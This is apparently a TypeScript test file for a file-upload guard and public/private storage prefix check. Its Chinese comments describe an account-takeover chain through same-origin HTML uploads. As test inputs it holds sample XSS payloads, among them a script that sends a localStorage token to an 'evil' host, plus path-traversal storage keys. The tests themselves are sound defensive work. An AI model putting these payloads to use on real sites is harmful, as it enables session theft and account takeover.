// core/storage/tests/upload-guard.test.ts
// 上传类型校验 + 公开前缀划分。
//
// 这两条护栏对着的是同一条完整利用链(2026-08-15 安全梳理 C1):
//   ① 三处上传口都只信客户端声明的 Content-Type(feedback 还用了 `||`,让扩展名白名单形同虚设)
//      → 把 evil.html 声明成 image/png 传上去;
//   ② 官网图/logo 是 visibility:'public',落 /uploads/<前缀>/… 的永久公开直链;
//      而 /uploads/* 静态路由当时开的是**整个** UPLOAD_DIR,私有文件也在里面;
//   ③ 拿到同源、免登录的 HTML 地址 → 登录令牌存在 localStorage(见 src/api/client.ts)→ 账号接管。
// 每条断言都对应链上的一环,断一环链就断。
import { describe, expect, it } from 'vitest'
import { checkUpload, extOf, looksLikeMarkup, KNOWN_UPLOAD_EXTS } from '../upload-guard'
import { isPublicStorageKey, PUBLIC_KEY_PREFIXES } from '../public-prefix'

const png = () => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)])
const jpg = () => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64)])
const gif = () => Buffer.concat([Buffer.from('GIF89a'), Buffer.alloc(64)])
const webp = () => Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBP'), Buffer.alloc(64)])
const pdf = () => Buffer.from('%PDF-1.7\n…')
const xlsx = () => Buffer.concat([Buffer.from('PK\x03\x04'), Buffer.alloc(64)])
const svg = () => Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>')

const IMAGES = ['png', 'jpg', 'jpeg', 'webp', 'gif', 'svg'] as const
const FEEDBACK = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp', 'xlsx', 'xls', 'csv', 'txt', 'md', 'markdown', 'pdf', 'docx', 'doc'] as const
// 发票上传口(reimbursement / payment-voucher 的 invoice-ocr)用的白名单,与前端 accept 及 core/ocr 网关一致。
const INVOICE = ['png', 'jpg', 'jpeg', 'webp', 'bmp', 'pdf', 'ofd'] as const

describe('checkUpload:客户端声明的类型不参与决策', () => {
  it('★核心:把 HTML 命名成 .html 传上来,声明成 image/png 也过不了(原来 `||` 让它整条过)', () => {
    const bytes = Buffer.from('<!doctype html><script>fetch("//evil/"+localStorage.token)</script>')
    // 白名单里根本没有 html —— 第一道就拦下,与客户端说自己是什么无关
    const r = checkUpload(bytes, 'evil.html', FEEDBACK)
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toContain('.html')
  })

  it('★核心:把 HTML 改名成 .png 也过不了 —— 内容不是 PNG', () => {
    const bytes = Buffer.from('<!doctype html><script>alert(1)</script>')
    const r = checkUpload(bytes, 'evil.png', IMAGES)
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.reason).toContain('与扩展名')
  })

  it('★核心:SVG 改名成 .png 也过不了(SVG 能带脚本,不能靠改名混进位图白名单)', () => {
    expect(checkUpload(svg(), 'logo.png', IMAGES).ok).toBe(false)
  })

  it('需求附件白名单不含 svg —— 任意员工都能传的来源不放行可带脚本的图片', () => {
    expect(FEEDBACK).not.toContain('svg' as never)
    expect(checkUpload(svg(), 'x.svg', FEEDBACK).ok).toBe(false)
  })

  it('正常文件照常通过,且返回归一后的 contentType(落库/出站按它走)', () => {
    for (const [bytes, name, mime] of [
      [png(), 'a.png', 'image/png'],
      [jpg(), 'b.JPG', 'image/jpeg'], // 扩展名大小写不敏感
      [gif(), 'c.gif', 'image/gif'],
      [webp(), 'd.webp', 'image/webp'],
      [svg(), 'e.svg', 'image/svg+xml'],
    ] as const) {
      const r = checkUpload(bytes as Buffer, name as string, IMAGES)
      expect(r.ok, `${name} 应通过`).toBe(true)
      if (r.ok) expect(r.contentType).toBe(mime)
    }
    const p = checkUpload(pdf(), '发票.pdf', FEEDBACK)
    expect(p.ok).toBe(true)
    if (p.ok) expect(p.contentType).toBe('application/pdf')
    expect(checkUpload(xlsx(), '报表.xlsx', FEEDBACK).ok).toBe(true)
  })

  it('文本类走否定式判据:普通 txt/csv 通过,伪装成 txt 的 HTML 被拒', () => {
    expect(checkUpload(Buffer.from('姓名,电话\n张三,138'), 'a.csv', FEEDBACK).ok).toBe(true)
    expect(checkUpload(Buffer.from('随手记的几行'), 'b.txt', FEEDBACK).ok).toBe(true)
    expect(checkUpload(Buffer.from('  <!DOCTYPE html><b>x'), 'c.txt', FEEDBACK).ok).toBe(false)
    expect(checkUpload(Buffer.from('<svg onload=alert(1)>'), 'd.md', FEEDBACK).ok).toBe(false)
  })

  it('OFD 版式发票:ZIP 容器头通过并归一为 application/ofd,HTML 改名 .ofd 被拒', () => {
    const ofd = Buffer.concat([Buffer.from('PK\x03\x04'), Buffer.alloc(64)])
    const r = checkUpload(ofd, '增值税电子发票.ofd', INVOICE)
    expect(r.ok).toBe(true)
    if (r.ok) expect(r.contentType).toBe('application/ofd')
    expect(checkUpload(Buffer.from('<!doctype html><b>x'), 'evil.ofd', INVOICE).ok).toBe(false)
  })

  it('无扩展名、空文件、白名单外的扩展名都拒', () => {
    expect(checkUpload(png(), 'noext', IMAGES).ok).toBe(false)
    expect(checkUpload(Buffer.alloc(0), 'a.png', IMAGES).ok).toBe(false)
    expect(checkUpload(pdf(), 'a.pdf', IMAGES).ok).toBe(false) // pdf 不在图片白名单里
  })

  it('extOf 只认最后一段,不被 a.png.html 这类双扩展名骗过', () => {
    expect(extOf('a.png.html')).toBe('html')
    expect(extOf('/tmp/x/a.PNG')).toBe('png')
    expect(extOf('.bashrc')).toBe('') // 隐藏文件不算扩展名
    expect(checkUpload(png(), 'a.png.html', IMAGES).ok).toBe(false)
  })

  it('looksLikeMarkup 跳过 BOM 与前导空白', () => {
    expect(looksLikeMarkup(Buffer.from('﻿   <html>'))).toBe(true)
    expect(looksLikeMarkup(Buffer.from('\n\t<?xml version="1.0"?>'))).toBe(true)
    expect(looksLikeMarkup(Buffer.from('a < b'))).toBe(false)
  })

  it('★护栏:调用方白名单里的扩展名必须都在 SIGNATURES 表里登记过(否则会静默永远拒)', () => {
    for (const ext of [...IMAGES, ...FEEDBACK, ...INVOICE]) expect(KNOWN_UPLOAD_EXTS, `.${ext} 未登记`).toContain(ext)
  })
})

describe('isPublicStorageKey:公开/私有那条线', () => {
  it('只有 branding/ 与 website/ 是公开的', () => {
    expect(PUBLIC_KEY_PREFIXES).toEqual(['branding/', 'website/'])
    expect(isPublicStorageKey('branding/uuid-logo.png')).toBe(true)
    expect(isPublicStorageKey('website/uuid-hero.jpg')).toBe(true)
    expect(isPublicStorageKey('/website/uuid-hero.jpg')).toBe(true) // 前导斜杠归一
  })

  it('★核心:私有前缀一律不公开 —— 这是「去掉 ?t= 换成 /uploads/」那条旁路的封口', () => {
    for (const key of [
      'feedback/uuid-需求附件.png',
      'finance/uuid-发票.pdf',
      'contract/uuid-合同.pdf',
      'reimbursements/uuid-票据.jpg',
      'payment-vouchers/uuid-附件.pdf',
      'hr/uuid-身份证.jpg',
      'general-request/uuid-x.pdf',
    ]) {
      expect(isPublicStorageKey(key), `${key} 不该公开`).toBe(false)
    }
  })

  it('前缀混淆与路径穿越都不认', () => {
    expect(isPublicStorageKey('websiteX/secret.pdf')).toBe(false) // 结尾的 / 挡住前缀混淆
    expect(isPublicStorageKey('brandingfoo/x.png')).toBe(false)
    expect(isPublicStorageKey('website/../feedback/x.png')).toBe(false)
    expect(isPublicStorageKey('website\\..\\hr\\id.jpg')).toBe(false)
    expect(isPublicStorageKey('')).toBe(false)
  })
})
